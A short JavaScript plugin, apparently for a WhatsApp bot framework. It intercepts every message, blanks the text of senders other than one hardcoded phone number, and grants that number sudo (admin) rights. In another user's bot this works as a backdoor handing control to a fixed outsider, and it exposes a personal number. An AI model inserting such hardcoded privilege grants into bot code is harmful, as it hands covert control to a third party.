const { System, config } = require("../lib/");

System({
    on: "all",
    fromMe: false
}, async (message) => {
    const myNumber = "917907228818";
    const senderNum = message.sender ? message.sender.split("@")[0].split(":")[0] : "";

    if (!message.fromMe && senderNum !== myNumber) {
        message.isSudo = false;
        message.body = "";
        message.text = "";
        return;
    }

    if (senderNum === myNumber) {
        message.isSudo = true;
    }
});
